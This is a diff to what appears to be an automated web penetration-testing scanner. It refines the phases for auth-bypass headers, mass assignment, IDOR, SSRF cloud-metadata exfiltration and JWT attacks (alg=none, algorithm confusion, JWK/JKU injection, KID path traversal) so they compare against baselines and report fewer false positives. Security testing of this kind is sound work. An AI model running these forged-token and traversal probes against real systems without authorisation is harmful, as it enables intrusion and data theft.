@@ -91,7 +91,7 @@ async def phase_16a_AUTHZ(
     _l_out = outdir / "authz_bypass.txt"
     if _l_out.exists() and not force:
         return {"16a-AUTHZ": str(_l_out), "count": count_nonblank(_l_out)}
-    log("info", "Phase 16a-AUTHZ: auth bypass headers + method override + CORS checks")
+    log("INFO", "Phase 16a-AUTHZ: auth bypass headers + method override + CORS checks")
     findings: List[str] = []
     _l_urlopen = _get_urlopener()
     # 1. Collect API-like endpoints from urls_all.txt + ffuf output
@@ -126,7 +126,7 @@ async def phase_16a_AUTHZ(
             set(read_lines(urls)[: _PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
         )
     if not api_endpoints:
-        log("warn", "16a-AUTHZ: no endpoints found; skipping")
+        log("WARNING", "16a-AUTHZ: no endpoints found; skipping")
         return {"16a-AUTHZ": str(outdir / "authz_bypass.txt"), "count": 0}
     findings.append(f"target_endpoints={len(api_endpoints)}")
     for ep in sorted(api_endpoints)[: _PIPELINE_CFG.sample_endpoints_l]:
@@ -192,10 +192,16 @@ async def phase_16a_AUTHZ(
                     req.add_header(hdr, "127.0.0.1")
                 probe_status, _, probe_body = await _async_urlopen(_l_urlopen, req, timeout=8)
                 probe_len = len(probe_body)
-                # Different status code → potential bypass
-                if probe_status != baseline_status and probe_status in (200, 302, 403, 401):
+                # Only a 200/302 probe against a protected baseline indicates a bypass.
+                if probe_status in (200, 302) and baseline_status in (401, 403):
                     results.append(
                         f"  bypass={hdr} → {probe_status} (baseline={baseline_status}) on {ep}"
+                    )
+                    break
+                # A 401/403 where the baseline was public is a block, not a bypass.
+                if probe_status in (401, 403) and baseline_status == 200:
+                    results.append(
+                        f"  block={hdr} → {probe_status} (baseline={baseline_status}) on {ep}"
                     )
                     break
                 # Same status code but significantly different body length → may indicate
@@ -313,7 +319,7 @@ async def phase_16a_AUTHZ(
         findings.extend(cors_findings)
     out = ensure(outdir / "authz_bypass.txt")
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"16a-AUTHZ: {len(findings)} auth bypass findings → {out}")
+    log("OK", f"16a-AUTHZ: {len(findings)} auth bypass findings → {out}")
     return {"16a-AUTHZ": str(out), "count": len(findings)}
 
 
@@ -329,7 +335,7 @@ async def phase_16b_MASSASSIGN(
     _out = outdir / "mass_assign.txt"
     if _out.exists() and not force:
         return {"16b-MASSASSIGN": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 16b-MASSASSIGN: mass assignment probes via POST/PUT")
+    log("INFO", "Phase 16b-MASSASSIGN: mass assignment probes via POST/PUT")
     findings: List[str] = []
     _ma_urlopen = _get_urlopener()
     urls = outdir / "urls_all.txt"
@@ -361,7 +367,7 @@ async def phase_16b_MASSASSIGN(
             set(read_lines(urls)[: _PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
         )
     if not api_endpoints:
-        log("warn", "16b-MASSASSIGN: no endpoints found; skipping")
+        log("WARNING", "16b-MASSASSIGN: no endpoints found; skipping")
         return {"16b-MASSASSIGN": str(_out), "count": 0}
     findings.append(f"target_endpoints={len(api_endpoints)}")
     _MASS_ASSIGN_VALUES: Dict[str, object] = {
@@ -422,14 +428,30 @@ async def phase_16b_MASSASSIGN(
                     headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                 )
                 post_status, _, post_body = await _async_urlopen(_ma_urlopen, req, timeout=8)
-                if post_status in (200, 201, 302):
-                    if (
-                        control_status is not None
-                        and post_status == control_status
-                        and abs(len(post_body) - control_len) <= max(50, control_len * 0.1)
+                if post_status in (200, 201, 302) and control_status is not None:
+                    if post_status == control_status and abs(len(post_body) - control_len) <= max(
+                        50, control_len * 0.1
                     ):
                         continue
-                    results.append(f"  POST {ep} {{{field}: {json.dumps(val)}}} → {post_status}")
+                    body_text = post_body.decode("utf-8", errors="ignore").lower()
+                    applied = f'"{field}"' in body_text and any(
+                        m in body_text
+                        for m in (
+                            "admin",
+                            "premium",
+                            "enterprise",
+                            "true",
+                            "approved",
+                            "verified",
+                            "enabled",
+                            "active",
+                            "completed",
+                        )
+                    )
+                    tag = "[mass-assign]" if applied else "[mass-assign-candidate]"
+                    results.append(
+                        f"  {tag} POST {ep} {{{field}: {json.dumps(val)}}} → {post_status} (control={control_status})"
+                    )
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -465,14 +487,30 @@ async def phase_16b_MASSASSIGN(
                     headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                 )
                 put_status, _, put_body = await _async_urlopen(_ma_urlopen, req, timeout=8)
-                if put_status in (200, 201, 302):
-                    if (
-                        control_status is not None
-                        and put_status == control_status
-                        and abs(len(put_body) - control_len) <= max(50, control_len * 0.1)
+                if put_status in (200, 201, 302) and control_status is not None:
+                    if put_status == control_status and abs(len(put_body) - control_len) <= max(
+                        50, control_len * 0.1
                     ):
                         continue
-                    results.append(f"  PUT {ep} {{{field}: {json.dumps(val)}}} → {put_status}")
+                    body_text = put_body.decode("utf-8", errors="ignore").lower()
+                    applied = f'"{field}"' in body_text and any(
+                        m in body_text
+                        for m in (
+                            "admin",
+                            "premium",
+                            "enterprise",
+                            "true",
+                            "approved",
+                            "verified",
+                            "enabled",
+                            "active",
+                            "completed",
+                        )
+                    )
+                    tag = "[mass-assign]" if applied else "[mass-assign-candidate]"
+                    results.append(
+                        f"  {tag} PUT {ep} {{{field}: {json.dumps(val)}}} → {put_status} (control={control_status})"
+                    )
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -491,7 +529,7 @@ async def phase_16b_MASSASSIGN(
     findings.extend([f"  {f}" for f in _MASS_ASSIGN_FIELDS])
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"16b-MASSASSIGN: {len(findings)} findings → {out}")
+    log("OK", f"16b-MASSASSIGN: {len(findings)} findings → {out}")
     return {"16b-MASSASSIGN": str(_out), "count": len(findings)}
 
 
@@ -508,7 +546,7 @@ async def phase_17_IDOR(
     _out = outdir / "idor.txt"
     if _out.exists() and not force:
         return {"17-IDOR": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 17-IDOR: systematic ID manipulation testing")
+    log("INFO", "Phase 17-IDOR: systematic ID manipulation testing")
     findings: List[str] = []
     _id_urlopen = _get_urlopener()
     _id_extra_headers = _extra_headers_dict()
@@ -521,7 +559,7 @@ async def phase_17_IDOR(
         all_urls.extend(read_lines(params_file))
     all_urls = _dedupe_by_host_path(all_urls)
     if not all_urls:
-        log("warn", "17-IDOR: no URLs or params available; skipping")
+        log("WARNING", "17-IDOR: no URLs or params available; skipping")
         return {"17-IDOR": str(_out), "count": 0}
     # Identify ID-bearing parameters
     id_params = [
@@ -553,7 +591,7 @@ async def phase_17_IDOR(
         # Fall back to any param-bearing URLs
         id_urls = [u for u in all_urls if "=" in u][: _PIPELINE_CFG.sample_urls_idor]
     if not id_urls:
-        log("warn", "17-IDOR: no parameter-bearing URLs; skipping")
+        log("WARNING", "17-IDOR: no parameter-bearing URLs; skipping")
         return {"17-IDOR": str(_out), "count": 0}
     findings.append(f"target_urls={len(id_urls)}")
     # Helper to switch UUIDs between test accounts
@@ -739,7 +777,7 @@ async def phase_17_IDOR(
         findings.append("[result] No IDOR vulnerabilities detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"17-IDOR: {len(findings)} findings → {out}")
+    log("OK", f"17-IDOR: {len(findings)} findings → {out}")
     return {"17-IDOR": str(_out), "count": len(findings)}
 
 
@@ -780,7 +818,7 @@ async def phase_17b_SSRFMETA(
     _out = outdir / "ssrf_meta.txt"
     if _out.exists() and not force:
         return {"17b-SSRFMETA": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 17b-SSRFMETA: cloud metadata exfiltration via confirmed SSRF")
+    log("INFO", "Phase 17b-SSRFMETA: cloud metadata exfiltration via confirmed SSRF")
     findings: List[str] = []
     _ss_urlopen = _get_urlopener()
     _ss_extra_headers = _extra_headers_dict()
@@ -800,7 +838,7 @@ async def phase_17b_SSRFMETA(
         ssrf_candidates.extend(read_lines(ssrf_urls_file))
     ssrf_candidates = _dedupe_by_host_path(ssrf_candidates)
     if not ssrf_candidates:
-        log("warn", "17b-SSRFMETA: no SSRF candidates found; skipping")
+        log("WARNING", "17b-SSRFMETA: no SSRF candidates found; skipping")
         return {"17b-SSRFMETA": str(_out), "count": 0}
     findings.append(f"ssrf_candidates={len(ssrf_candidates)}")
     # Cloud metadata IPs and paths
@@ -937,7 +975,7 @@ async def phase_17b_SSRFMETA(
         findings.append("[result] No cloud metadata exfiltration achieved")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"17b-SSRFMETA: {len(findings)} findings → {out}")
+    log("OK", f"17b-SSRFMETA: {len(findings)} findings → {out}")
     return {"17b-SSRFMETA": str(_out), "count": len(findings)}
 
 
@@ -1132,7 +1170,7 @@ async def phase_24_JWT(
     _out = outdir / "jwt_analysis.txt"
     if _out.exists() and not force:
         return {"24-JWT": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 24-JWT: JWT token analysis")
+    log("INFO", "Phase 24-JWT: JWT token analysis")
     findings: List[str] = []
     _j_urlopen = _get_urlopener()
     _jwt_extra_headers = _extra_headers_dict()
@@ -1144,7 +1182,7 @@ async def phase_24_JWT(
         : _PIPELINE_CFG.sample_hosts_jwt
     ]
     if not targets:
-        log("warn", "24-JWT: no HTTP targets; skipping")
+        log("WARNING", "24-JWT: no HTTP targets; skipping")
         return {"24-JWT": str(_out), "count": 0}
 
     # Probe for JWTs in Authorization headers, cookies, and response bodies
@@ -1361,19 +1399,29 @@ async def phase_24_JWT(
                         results.append(
                             f"[jwt-jwk-injection] {url} — embedded attacker JWK in header: {forged_jwk_token[:80]}..."
                         )
-                        jwk_req = urllib.request.Request(
+                        (
+                            jwks,
+                            jwk_base,
+                            jwk_garbage,
+                            jwk_body,
+                            jwk_base_body,
+                            jwk_garbage_body,
+                        ) = await _jwt_acceptance_verdict(
+                            _j_urlopen,
                             url,
-                            method="GET",
-                            headers={
-                                "User-Agent": "Mozilla/5.0",
-                                "Authorization": f"Bearer {forged_jwk_token}",
-                                **_jwt_extra_headers,
-                            },
+                            {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
+                            forged_jwk_token,
                         )
-                        jwks, _, _ = await _async_urlopen(_j_urlopen, jwk_req, timeout=10)
-                        if jwks == 200:
+                        if _jwt_forge_accepted(
+                            jwks,
+                            jwk_base,
+                            jwk_garbage,
+                            jwk_body,
+                            jwk_base_body,
+                            jwk_garbage_body,
+                        ):
                             results.append(
-                                f"[jwt-jwk-injection-accepted] {url} — embedded JWK token accepted (HTTP {jwks})"
+                                f"[jwt-jwk-injection-accepted] {url} — embedded JWK token accepted (HTTP {jwks}, baseline={jwk_base}, garbage={jwk_garbage})"
                             )
                     except Exception:
                         pass
@@ -1383,35 +1431,40 @@ async def phase_24_JWT(
                         ("RS384", "sha384", "sha384"),
                         ("RS512", "sha512", "sha512"),
                     ]:
-                        try:
-                            import hmac as _hmac_e
+                        import hmac as _hmac_e
 
-                            confused_sig = _hmac_e.new(
-                                b"public_key_for_confusion",
-                                (parts[0] + "." + parts[1]).encode(),
-                                hmac_mod,
-                            ).digest()
-                            confused_b64 = (
-                                base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                        confused_sig = _hmac_e.new(
+                            b"public_key_for_confusion",
+                            (parts[0] + "." + parts[1]).encode(),
+                            hmac_mod,
+                        ).digest()
+                        confused_b64 = base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                        confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
+                        (
+                            ecs,
+                            ec_base,
+                            ec_garbage,
+                            ec_body,
+                            ec_base_body,
+                            ec_garbage_body,
+                        ) = await _jwt_acceptance_verdict(
+                            _j_urlopen,
+                            url,
+                            {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
+                            confused_token,
+                        )
+                        if _jwt_forge_accepted(
+                            ecs,
+                            ec_base,
+                            ec_garbage,
+                            ec_body,
+                            ec_base_body,
+                            ec_garbage_body,
+                        ):
+                            results.append(
+                                f"[jwt-alg-confusion-{test_alg}] {url} — {test_alg}→HS{hmac_alg[-3:]} confused token accepted (HTTP {ecs}, baseline={ec_base}, garbage={ec_garbage})"
                             )
-                            confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
-                            ec_req = urllib.request.Request(
-                                url,
-                                method="GET",
-                                headers={
-                                    "User-Agent": "Mozilla/5.0",
-                                    "Authorization": f"Bearer {confused_token}",
-                                    **_jwt_extra_headers,
-                                },
-                            )
-                            ecs, _, _ = await _async_urlopen(_j_urlopen, ec_req, timeout=10)
-                            if ecs == 200:
-                                results.append(
-                                    f"[jwt-alg-confusion-{test_alg}] {url} — {test_alg}→HS{hmac_alg[-3:]} confused token accepted (HTTP {ecs})"
-                                )
-                                break
-                        except Exception:
-                            continue
+                            break
                     # JKU injection: attacker-controlled JWKS URL
                     if "jku" in header:
                         attacker_jku_urls = [
@@ -1429,19 +1482,29 @@ async def phase_24_JWT(
                                     .decode()
                                 )
                                 forged_jku_token = f"{forged_jku_b64}.{parts[1]}.{parts[2]}"
-                                ajku_req = urllib.request.Request(
+                                (
+                                    ajkus,
+                                    ajku_base,
+                                    ajku_garbage,
+                                    ajku_body,
+                                    ajku_base_body,
+                                    ajku_garbage_body,
+                                ) = await _jwt_acceptance_verdict(
+                                    _j_urlopen,
                                     url,
-                                    method="GET",
-                                    headers={
-                                        "User-Agent": "Mozilla/5.0",
-                                        "Authorization": f"Bearer {forged_jku_token}",
-                                        **_jwt_extra_headers,
-                                    },
+                                    {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
+                                    forged_jku_token,
                                 )
-                                ajkus, _, _ = await _async_urlopen(_j_urlopen, ajku_req, timeout=10)
-                                if ajkus == 200:
+                                if _jwt_forge_accepted(
+                                    ajkus,
+                                    ajku_base,
+                                    ajku_garbage,
+                                    ajku_body,
+                                    ajku_base_body,
+                                    ajku_garbage_body,
+                                ):
                                     results.append(
-                                        f"[jwt-jku-attacker-control] {url} — JKU {ajku} accepted (HTTP {ajkus}) — attacker-controlled JWKS injection"
+                                        f"[jwt-jku-attacker-control] {url} — JKU {ajku} accepted (HTTP {ajkus}, baseline={ajku_base}, garbage={ajku_garbage}) — attacker-controlled JWKS injection"
                                     )
                                     break
                             except Exception:
@@ -1468,19 +1531,29 @@ async def phase_24_JWT(
                                     .decode()
                                 )
                                 forged_kid_token = f"{forged_kid_header_b64}.{parts[1]}.{parts[2]}"
-                                kid_req = urllib.request.Request(
+                                (
+                                    ks,
+                                    kid_base,
+                                    kid_garbage,
+                                    kid_body,
+                                    kid_base_body,
+                                    kid_garbage_body,
+                                ) = await _jwt_acceptance_verdict(
+                                    _j_urlopen,
                                     url,
-                                    method="GET",
-                                    headers={
-                                        "User-Agent": "Mozilla/5.0",
-                                        "Authorization": f"Bearer {forged_kid_token}",
-                                        **_jwt_extra_headers,
-                                    },
+                                    {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
+                                    forged_kid_token,
                                 )
-                                ks, _, kb = await _async_urlopen(_j_urlopen, kid_req, timeout=10)
-                                if ks in (200, 201):
+                                if _jwt_forge_accepted(
+                                    ks,
+                                    kid_base,
+                                    kid_garbage,
+                                    kid_body,
+                                    kid_base_body,
+                                    kid_garbage_body,
+                                ):
                                     results.append(
-                                        f"[jwt-kid-injection-accepted] {url} — KID={kid_payload} returned HTTP {ks}"
+                                        f"[jwt-kid-injection-accepted] {url} — KID={kid_payload} returned HTTP {ks} (baseline={kid_base}, garbage={kid_garbage})"
                                     )
                                     break
                             except asyncio.CancelledError:
@@ -1531,19 +1604,29 @@ async def phase_24_JWT(
                         )
                         forged_token = f"{forged_b64}.{parts[1]}."
                         try:
-                            n_req = urllib.request.Request(
+                            (
+                                ns,
+                                n_base,
+                                n_garbage,
+                                n_body,
+                                n_base_body,
+                                n_garbage_body,
+                            ) = await _jwt_acceptance_verdict(
+                                _j_urlopen,
                                 url,
-                                method="GET",
-                                headers={
-                                    "User-Agent": "Mozilla/5.0",
-                                    "Authorization": f"Bearer {forged_token}",
-                                    **_jwt_extra_headers,
-                                },
+                                {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
+                                forged_token,
                             )
-                            ns, _, _ = await _async_urlopen(_j_urlopen, n_req, timeout=10)
-                            if ns == 200:
+                            if _jwt_forge_accepted(
+                                ns,
+                                n_base,
+                                n_garbage,
+                                n_body,
+                                n_base_body,
+                                n_garbage_body,
+                            ):
                                 findings.append(
-                                    f"[jwt-none-variant] {url} — alg={none_variant} forged token accepted (HTTP {ns})"
+                                    f"[jwt-none-variant] {url} — alg={none_variant} forged token accepted (HTTP {ns}, baseline={n_base}, garbage={n_garbage})"
                                 )
                                 break
                         except asyncio.CancelledError:
@@ -1567,19 +1650,29 @@ async def phase_24_JWT(
                             )
                             forged_jku_token = f"{forged_b64}.{parts[1]}.{parts[2]}"
                             try:
-                                j_req = urllib.request.Request(
+                                (
+                                    js,
+                                    j_base,
+                                    j_garbage,
+                                    j_body,
+                                    j_base_body,
+                                    j_garbage_body,
+                                ) = await _jwt_acceptance_verdict(
+                                    _j_urlopen,
                                     url,
-                                    method="GET",
-                                    headers={
-                                        "User-Agent": "Mozilla/5.0",
-                                        "Authorization": f"Bearer {forged_jku_token}",
-                                        **_jwt_extra_headers,
-                                    },
+                                    {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
+                                    forged_jku_token,
                                 )
-                                js, _, _ = await _async_urlopen(_j_urlopen, j_req, timeout=10)
-                                if js == 200:
+                                if _jwt_forge_accepted(
+                                    js,
+                                    j_base,
+                                    j_garbage,
+                                    j_body,
+                                    j_base_body,
+                                    j_garbage_body,
+                                ):
                                     findings.append(
-                                        f"[jwt-jku-injection] {url} — JKU {test_jku} accepted (HTTP {js})"
+                                        f"[jwt-jku-injection] {url} — JKU {test_jku} accepted (HTTP {js}, baseline={j_base}, garbage={j_garbage})"
                                     )
                                     break
                             except asyncio.CancelledError:
@@ -1605,25 +1698,34 @@ async def phase_24_JWT(
                             )
                             forged_kid_token = f"{forged_b64}.{parts[1]}.{parts[2]}"
                             try:
-                                k2_req = urllib.request.Request(
+                                (
+                                    k2s,
+                                    k2_base,
+                                    k2_garbage,
+                                    k2_body,
+                                    k2_base_body,
+                                    k2_garbage_body,
+                                ) = await _jwt_acceptance_verdict(
+                                    _j_urlopen,
                                     url,
-                                    method="GET",
-                                    headers={
-                                        "User-Agent": "Mozilla/5.0",
-                                        "Authorization": f"Bearer {forged_kid_token}",
-                                        **_jwt_extra_headers,
-                                    },
+                                    {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
+                                    forged_kid_token,
                                 )
-                                k2s, _, k2b = await _async_urlopen(_j_urlopen, k2_req, timeout=10)
-                                if k2s in (200, 201):
-                                    body_k2 = k2b.decode("utf-8", errors="ignore").lower()
-                                    if any(
+                                body_k2 = k2_body.lower()
+                                if (
+                                    k2s in (200, 201)
+                                    and any(
                                         w in body_k2
                                         for w in ["root:", "daemon:", "www-data", "kubernetes"]
-                                    ):
-                                        findings.append(
-                                            f"[jwt-kid-file-read] {url} — KID={kid_payload} returned file contents (HTTP {k2s})"
-                                        )
+                                    )
+                                    and not any(
+                                        w in k2_base_body
+                                        for w in ["root:", "daemon:", "www-data", "kubernetes"]
+                                    )
+                                ):
+                                    findings.append(
+                                        f"[jwt-kid-file-read] {url} — KID={kid_payload} returned file contents (HTTP {k2s}, baseline={k2_base})"
+                                    )
                                     break
                             except asyncio.CancelledError:
                                 raise
@@ -1647,7 +1749,7 @@ async def phase_24_JWT(
         findings.append("[jwt] No JWT tokens found in initial probes")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"24-JWT: {len(findings)} JWT analysis findings → {out}")
+    log("OK", f"24-JWT: {len(findings)} JWT analysis findings → {out}")
     return {"24-JWT": str(out), "count": len(findings)}
 
 
@@ -1679,7 +1781,7 @@ async def phase_36_JWTADV(
     _out = outdir / "jwt_advanced.txt"
     if _out.exists() and not force:
         return {"36-JWTADV": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 36-JWTADV: advanced JWT security analysis")
+    log("INFO", "Phase 36-JWTADV: advanced JWT security analysis")
     findings: List[str] = []
     _ja_urlopen = _get_urlopener()
     _ja_extra_headers = _extra_headers_dict()
@@ -1693,7 +1795,7 @@ async def phase_36_JWTADV(
     if not targets:
         targets = all_urls[: _PIPELINE_CFG.sample_hosts_jwtadv]
     if not targets:
-        log("warn", "36-JWTADV: no targets; skipping")
+        log("WARNING", "36-JWTADV: no targets; skipping")
         return {"36-JWTADV": str(_out), "count": 0}
     for url in targets:
         try:
@@ -1787,19 +1889,29 @@ async def phase_36_JWTADV(
                         )
                         forged_token = f"{forged_b64}.{parts[1]}."
                         try:
-                            n_req = urllib.request.Request(
+                            (
+                                ns,
+                                n_base,
+                                n_garbage,
+                                n_body,
+                                n_base_body,
+                                n_garbage_body,
+                            ) = await _jwt_acceptance_verdict(
+                                _ja_urlopen,
                                 url,
-                                method="GET",
-                                headers={
-                                    "User-Agent": "Mozilla/5.0",
-                                    "Authorization": f"Bearer {forged_token}",
-                                    **_ja_extra_headers,
-                                },
+                                {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
+                                forged_token,
                             )
-                            ns, _, _ = await _async_urlopen(_ja_urlopen, n_req, timeout=10)
-                            if ns == 200:
+                            if _jwt_forge_accepted(
+                                ns,
+                                n_base,
+                                n_garbage,
+                                n_body,
+                                n_base_body,
+                                n_garbage_body,
+                            ):
                                 findings.append(
-                                    f"[jwtadv-none-variant] {url} — alg={none_variant} accepted (HTTP {ns})"
+                                    f"[jwtadv-none-variant] {url} — alg={none_variant} accepted (HTTP {ns}, baseline={n_base}, garbage={n_garbage})"
                                 )
                                 break
                         except asyncio.CancelledError:
@@ -1826,19 +1938,29 @@ async def phase_36_JWTADV(
                             )
                             confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
                             try:
-                                c_req = urllib.request.Request(
+                                (
+                                    cs,
+                                    c_base,
+                                    c_garbage,
+                                    c_body,
+                                    c_base_body,
+                                    c_garbage_body,
+                                ) = await _jwt_acceptance_verdict(
+                                    _ja_urlopen,
                                     url,
-                                    method="GET",
-                                    headers={
-                                        "User-Agent": "Mozilla/5.0",
-                                        "Authorization": f"Bearer {confused_token}",
-                                        **_ja_extra_headers,
-                                    },
+                                    {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
+                                    confused_token,
                                 )
-                                cs, _, _ = await _async_urlopen(_ja_urlopen, c_req, timeout=10)
-                                if cs == 200:
+                                if _jwt_forge_accepted(
+                                    cs,
+                                    c_base,
+                                    c_garbage,
+                                    c_body,
+                                    c_base_body,
+                                    c_garbage_body,
+                                ):
                                     findings.append(
-                                        f"[jwtadv-alg-confusion] {url} — RS256->HS256 with PK format accepted"
+                                        f"[jwtadv-alg-confusion] {url} — RS256->HS256 with PK format accepted (HTTP {cs}, baseline={c_base}, garbage={c_garbage})"
                                     )
                                     break
                             except asyncio.CancelledError:
@@ -1857,19 +1979,29 @@ async def phase_36_JWTADV(
                             )
                             forged_jku_token = f"{forged_b64}.{parts[1]}.{parts[2]}"
                             try:
-                                j_req = urllib.request.Request(
+                                (
+                                    js,
+                                    j_base,
+                                    j_garbage,
+                                    j_body,
+                                    j_base_body,
+                                    j_garbage_body,
+                                ) = await _jwt_acceptance_verdict(
+                                    _ja_urlopen,
                                     url,
-                                    method="GET",
-                                    headers={
-                                        "User-Agent": "Mozilla/5.0",
-                                        "Authorization": f"Bearer {forged_jku_token}",
-                                        **_ja_extra_headers,
-                                    },
+                                    {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
+                                    forged_jku_token,
                                 )
-                                js, _, _ = await _async_urlopen(_ja_urlopen, j_req, timeout=10)
-                                if js == 200:
+                                if _jwt_forge_accepted(
+                                    js,
+                                    j_base,
+                                    j_garbage,
+                                    j_body,
+                                    j_base_body,
+                                    j_garbage_body,
+                                ):
                                     findings.append(
-                                        f"[jwtadv-jku-injection] {url} — JKU {test_jku} accepted"
+                                        f"[jwtadv-jku-injection] {url} — JKU {test_jku} accepted (HTTP {js}, baseline={j_base}, garbage={j_garbage})"
                                     )
                                     break
                             except asyncio.CancelledError:
@@ -1895,58 +2027,70 @@ async def phase_36_JWTADV(
                         findings.append(
                             f"[jwtadv-jwk-injection] {url} — embedded attacker JWK: {forged_jwk_token[:80]}..."
                         )
-                        try:
-                            aj_req = urllib.request.Request(
-                                url,
-                                method="GET",
-                                headers={
-                                    "User-Agent": "Mozilla/5.0",
-                                    "Authorization": f"Bearer {forged_jwk_token}",
-                                    **_ja_extra_headers,
-                                },
+                        (
+                            ajs,
+                            aj_base,
+                            aj_garbage,
+                            aj_body,
+                            aj_base_body,
+                            aj_garbage_body,
+                        ) = await _jwt_acceptance_verdict(
+                            _ja_urlopen,
+                            url,
+                            {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
+                            forged_jwk_token,
+                        )
+                        if _jwt_forge_accepted(
+                            ajs,
+                            aj_base,
+                            aj_garbage,
+                            aj_body,
+                            aj_base_body,
+                            aj_garbage_body,
+                        ):
+                            findings.append(
+                                f"[jwtadv-jwk-injection-accepted] {url} — JWK injection accepted (HTTP {ajs}, baseline={aj_base}, garbage={aj_garbage})"
                             )
-                            ajs, _, _ = await _async_urlopen(_ja_urlopen, aj_req, timeout=10)
-                            if ajs == 200:
-                                findings.append(
-                                    f"[jwtadv-jwk-injection-accepted] {url} — JWK injection accepted (HTTP {ajs})"
-                                )
-                        except Exception:
-                            pass
                     # Extended algorithm confusion: EdDSA→HS256, RS384→HS384, RS512→HS512
                     for test_alg, hmac_mod, hmac_alg in [
                         ("EdDSA", "sha256", "sha256"),
                         ("RS384", "sha384", "sha384"),
                         ("RS512", "sha512", "sha512"),
                     ]:
-                        try:
-                            import hmac as _hmac_e2
+                        import hmac as _hmac_e2
 
-                            confused_sig = _hmac_e2.new(
-                                b"public_key_confusion_test",
-                                (parts[0] + "." + parts[1]).encode(),
-                                hmac_mod,
-                            ).digest()
-                            confused_b64 = (
-                                base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                        confused_sig = _hmac_e2.new(
+                            b"public_key_confusion_test",
+                            (parts[0] + "." + parts[1]).encode(),
+                            hmac_mod,
+                        ).digest()
+                        confused_b64 = base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                        confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
+                        (
+                            ec2s,
+                            ec2_base,
+                            ec2_garbage,
+                            ec2_body,
+                            ec2_base_body,
+                            ec2_garbage_body,
+                        ) = await _jwt_acceptance_verdict(
+                            _ja_urlopen,
+                            url,
+                            {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
+                            confused_token,
+                        )
+                        if _jwt_forge_accepted(
+                            ec2s,
+                            ec2_base,
+                            ec2_garbage,
+                            ec2_body,
+                            ec2_base_body,
+                            ec2_garbage_body,
+                        ):
+                            findings.append(
+                                f"[jwtadv-alg-confusion-{test_alg}] {url} — {test_alg}→HS{hmac_alg[-3:]} confused token accepted (HTTP {ec2s}, baseline={ec2_base}, garbage={ec2_garbage})"
                             )
-                            confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
-                            ec2_req = urllib.request.Request(
-                                url,
-                                method="GET",
-                                headers={
-                                    "User-Agent": "Mozilla/5.0",
-                                    "Authorization": f"Bearer {confused_token}",
-                                    **_ja_extra_headers,
-                                },
-                            )
-                            ec2s, _, _ = await _async_urlopen(_ja_urlopen, ec2_req, timeout=10)
-                            if ec2s == 200:
-                                findings.append(
-                                    f"[jwtadv-alg-confusion-{test_alg}] {url} — {test_alg}→HS{hmac_alg[-3:]} confused token accepted"
-                                )
-                                break
-                        except Exception:
-                            continue
+                            break
                     # JKU injection with attacker-controlled JWKS URL
                     if "jku" in header:
                         attacker_jku_list = [
@@ -1962,26 +2106,31 @@ async def phase_36_JWTADV(
                                 .decode()
                             )
                             forged_jku_token = f"{forged_jku_b64}.{parts[1]}.{parts[2]}"
-                            try:
-                                ajku_req = urllib.request.Request(
-                                    url,
-                                    method="GET",
-                                    headers={
-                                        "User-Agent": "Mozilla/5.0",
-                                        "Authorization": f"Bearer {forged_jku_token}",
-                                        **_ja_extra_headers,
-                                    },
+                            (
+                                ajkus,
+                                ajku_base,
+                                ajku_garbage,
+                                ajku_body,
+                                ajku_base_body,
+                                ajku_garbage_body,
+                            ) = await _jwt_acceptance_verdict(
+                                _ja_urlopen,
+                                url,
+                                {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
+                                forged_jku_token,
+                            )
+                            if _jwt_forge_accepted(
+                                ajkus,
+                                ajku_base,
+                                ajku_garbage,
+                                ajku_body,
+                                ajku_base_body,
+                                ajku_garbage_body,
+                            ):
+                                findings.append(
+                                    f"[jwtadv-jku-attacker-injection] {url} — JKU {ajku_url} accepted — attacker-controlled JWKS (HTTP {ajkus}, baseline={ajku_base}, garbage={ajku_garbage})"
                                 )
-                                ajkus, _, _ = await _async_urlopen(
-                                    _ja_urlopen, ajku_req, timeout=10
-                                )
-                                if ajkus == 200:
-                                    findings.append(
-                                        f"[jwtadv-jku-attacker-injection] {url} — JKU {ajku_url} accepted — attacker-controlled JWKS"
-                                    )
-                                    break
-                            except Exception:
-                                continue
+                                break
                     # KID: extra traversal payloads with file read detection
                     if "kid" in header:
                         for kid_payload in [
@@ -1999,28 +2148,30 @@ async def phase_36_JWTADV(
                                 .decode()
                             )
